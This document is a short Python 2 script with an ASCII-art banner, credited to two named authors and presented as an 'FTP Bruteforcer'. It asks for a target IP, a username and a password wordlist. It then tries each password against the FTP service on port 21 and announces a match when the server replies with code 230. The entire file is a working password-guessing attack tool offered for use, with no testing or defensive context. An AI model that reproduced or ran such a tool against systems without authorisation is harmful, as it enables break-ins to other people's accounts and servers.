#! /usr/bin/python

import socket
import re
import sys


print" "
print"                  /////'"
print"                 '  ^ o"
print"                 C   - |"
print"    ___          '  =__'        ___"
print"   (` _ \_       |   |        _/  ')"
print"    \  (__\  ,---- _ |----.  /__)- |"
print"     \__  ( (           /  ) )  __/"
print"       |_X_\/ \.   Y  _.|  \/_X_|"
print"         |  \ /(   /    /\ /  |"
print"          \ /  (  ,    /  \ _/"
print"               /______/"
print"Scripted By   [:::::::]  Luan Krasniqi v1.0"
print"Robert Shala /*%*%*%*%*\ FTP Bruteforcer"
print" "
print"-----------------------------------------"

ip = raw_input("IP Address\t:")
wordlist = raw_input("Wordlist file\t:")

def connect(username, password):
	

	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "[+] Testing " + username + " : " + password

	conn.connect((ip, 21))
	data = conn.recv(1024)

	conn.send('USER ' + username + '\r\n')


	data = conn.recv(1024)
	conn.send('PASS ' + password + '\r\n')
	
	data = conn.recv(3)
	conn.send('QUIT\r\n')

	conn.close()
	return data


username = raw_input("Username\t:")
print" "

with open (wordlist, "r") as myfile:
	passwords = myfile.readlines()

for password in passwords: 
	
	attempt = connect(username, password)
	if attempt == "230":
		print "[!!!] Password found: " + password
		sys.exit(0)
